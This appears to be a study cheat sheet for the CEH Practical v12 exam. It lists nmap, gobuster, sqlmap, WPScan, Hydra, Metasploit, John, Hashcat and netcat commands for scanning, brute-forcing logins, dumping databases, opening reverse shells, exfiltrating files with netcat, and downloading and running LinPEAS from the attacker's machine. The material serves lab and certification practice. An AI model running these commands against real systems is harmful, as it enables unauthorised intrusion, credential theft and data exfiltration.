
### **CEH Practical v12: Essential Tools & Flags Cheat Sheet**

**Golden Rule:** Your attacking machine IP is usually something like `192.168.1.10` or `10.10.10.10`. **Always run `ip a` or `ifconfig` first to confirm.**

---

### **1. Reconnaissance & Enumeration**

#### **Nmap (The King)**
*   **Purpose:** Discover hosts, open ports, services, and OS.
*   **Critical Flags:**
    ```bash
    # Basic Host Discovery (Ping Sweep)
    nmap -sn 192.168.1.0/24

    # Quick Top 1000 TCP Port Scan
    nmap -T4 192.168.1.50

    # Aggressive Scan (OS, Version, Scripts, Traceroute)
    nmap -A 192.168.1.50

    # Scan ALL Ports (Slower but thorough)
    nmap -p- 192.168.1.50

    # Scan Specific Ports
    nmap -p 22,80,443,8080 192.168.1.50

    # Version Detection + Default NSE Scripts
    nmap -sV -sC 192.168.1.50

    # UDP Port Scan (Important for DNS, SNMP)
    nmap -sU -p 53,161 192.168.1.50
    ```

#### **Gobuster/Dirb (Web Content Discovery)**
*   **Purpose:** Find hidden directories and files on a web server.
*   **Critical Flags:**
    ```bash
    # Basic Directory Bruteforcing
    gobuster dir -u http://192.168.1.50 -w /usr/share/wordlists/dirb/common.txt

    # Bruteforce with File Extensions (PHP, TXT, BAK)
    gobuster dir -u http://192.168.1.50 -w wordlist.txt -x php,txt,bak,old

    # Subdomain Enumeration (if you have a domain name)
    gobuster dns -d example.com -w /usr/share/wordlists/SecLists/subdomains.txt
    ```

---

### **2. Vulnerability Assessment & Exploitation**

#### **Nikto**
*   **Purpose:** Quick web server vulnerability scanner.
*   **Critical Flags:**
    ```bash
    nikto -h http://192.168.1.50
    # That's often all you need. It runs a default battery of tests.
    ```

#### **SQLMap (SQL Injection)**
*   **Purpose:** Automate detection and exploitation of SQLi.
*   **Critical Flags:**
    ```bash
    # Test a URL parameter
    sqlmap -u "http://site.com/page?id=1" --batch

    # Fetch database names
    sqlmap -u "http://site.com/page?id=1" --dbs

    # Fetch tables from a specific database
    sqlmap -u "http://site.com/page?id=1" -D database_name --tables

    # Dump data from a specific table
    sqlmap -u "http://site.com/page?id=1" -D database_name -T users --dump

    # Attempt to get an interactive OS shell (if DBA privileges)
    sqlmap -u "http://site.com/page?id=1" --os-shell
    ```

#### **WPScan (WordPress Assessment)**
*   **Purpose:** Enumerate and find vulnerabilities in WordPress sites.
*   **Critical Flags:**
    ```bash
    # Enumerate Users, Plugins, Themes
    wpscan --url http://192.168.1.50 --enumerate u,p,t

    # Password Bruteforce on the 'admin' user
    wpscan --url http://192.168.1.50 --usernames admin --passwords /usr/share/wordlists/rockyou.txt
    ```

#### **Metasploit (The Exploitation Framework)**
*   **Purpose:** Exploit known vulnerabilities.
*   **Workflow (Muscle Memory):**
    ```bash
    msfconsole                   # Start the framework
    search exploit_name          # e.g., search eternalblue
    use exploit/path/name       # e.g., use exploit/windows/smb/ms17_010_eternalblue
    show options                 # See what needs to be set
    set RHOSTS 192.168.1.50     # Set target IP
    set LHOST 192.168.1.10      # Set YOUR IP (for reverse shell)
    set PAYLOAD windows/x64/shell/reverse_tcp # Sometimes you need to set payload
    exploit OR run              # Launch the exploit

    # If you get a shell, background it with [CTRL+Z] or 'background'
    ```

---

### **3. Password Cracking**

#### **John the Ripper**
*   **Purpose:** Crack password hashes.
*   **Critical Flags:**
    ```bash
    # Crack a Linux shadow file (after unshadow)
    unshadow passwd.txt shadow.txt > hashes.txt
    john hashes.txt

    # Show cracked passwords
    john --show hashes.txt

    # Crack with a specific wordlist
    john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
    ```

#### **Hashcat (More Powerful, GPU-Based)**
*   **Purpose:** Crack password hashes very fast.
*   **Critical Flags:**
    ```bash
    # Crack MD5 hashes with rockyou.txt
    hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

    # Crack NTLM (Windows) hashes
    hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

    # Show cracked passwords
    hashcat -m 0 hashes.txt --show
    ```
    *   `-m 0`: MD5
    *   `-m 1000`: NTLM
    *   `-m 1800`: sha512crypt (Linux)

#### **Hydra (Network Login Bruteforcer)**
*   **Purpose:** Bruteforce logins for SSH, FTP, HTTP forms, etc.
*   **Critical Flags:**
    ```bash
    # Bruteforce SSH
    hydra -l username -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.50

    # Bruteforce HTTP POST Form (MOST COMMON ON EXAM)
    hydra -l admin -P rockyou.txt 192.168.1.50 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
    # The last part `F=Invalid` tells Hydra what a FAILED login looks like in the response.
    ```

---

### **4. Post-Exploitation & Shells**

#### **Netcat (Swiss Army Knife)**
*   **Purpose:** Listen for reverse shells, transfer files, connect to ports.
*   **Critical Flags:**
    ```bash
    # Listen on a port (for a reverse shell)
    nc -nvlp 4444

    # Connect to a bind shell on a target
    nc 192.168.1.50 4444

    # Transfer a file TO the target (from your machine)
    nc -nvlp 4444 < linpeas.sh  # On Attacker
    nc 192.168.1.10 4444 > linpeas.sh # On Target

    # Transfer a file FROM the target
    nc -nvlp 4444 > important.file # On Attacker
    nc 192.168.1.10 4444 < important.file # On Target
    ```

#### **LinPEAS (Linux Privilege Escalation)**
*   **Purpose:** **THE most important post-exploit script.** Automatically finds privesc vectors.
*   **How to use:**
    1.  Get a basic shell on the target.
    2.  Get LinPEAS on the target. Methods:
        *   `wget http://192.168.1.10:8000/linpeas.sh` (start a Python web server on your machine: `python3 -m http.server 8000`)
        *   Use the netcat file transfer method above.
    3.  Make it executable: `chmod +x linpeas.sh`
    4.  Run it: `./linpeas.sh | tee linpeas_output.txt` (saves output)

#### **Python3 Web Server**
*   **Purpose:** Host tools/files for download onto the target machine.
*   **Critical Command:**
    ```bash
    # Host the current directory on port 8000
    python3 -m http.server 8000
    # Then on the target: wget http://YOUR_IP:8000/file.txt
    ```

---

### **5. Handy One-Liners & Tricks**

*   **Stabilize a Shell:**
    ```bash
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    # Then background with [CTRL+Z]
    stty raw -echo; fg
    # Then press [ENTER]. You now have a fully interactive shell.
    ```

*   **Common Linux Privesc Checks (if LinPEAS isn't available):**
    ```bash
    # Find SUID files
    find / -perm -u=s -type f 2>/dev/null

    # Find files owned by root that are writable by you
    find / -user root -writable 2>/dev/null

    # Check for cron jobs
    cat /etc/crontab
    ls -la /etc/cron.*

    # Check sudo permissions
    sudo -l
    ```

*   **Find Flags:**
    ```bash
    # Search for files containing the word "FLAG"
    find / -name *.txt -o -name *.log -o -name *.bak 2>/dev/null | xargs grep -i "FLAG" 2>/dev/null

    # Common flag locations
    /home/*/user.txt
    /root/root.txt
    /var/www/html/*.txt
    ```

**Final Tool Tip:** The exam VM likely has most tools pre-installed. Your job is to know *which* tool to use and *the basic flags* to accomplish the task. Practice this workflow: **Scan -> Enumerate -> Exploit -> Privesc -> Find Flag.**

Good luck! You've got this.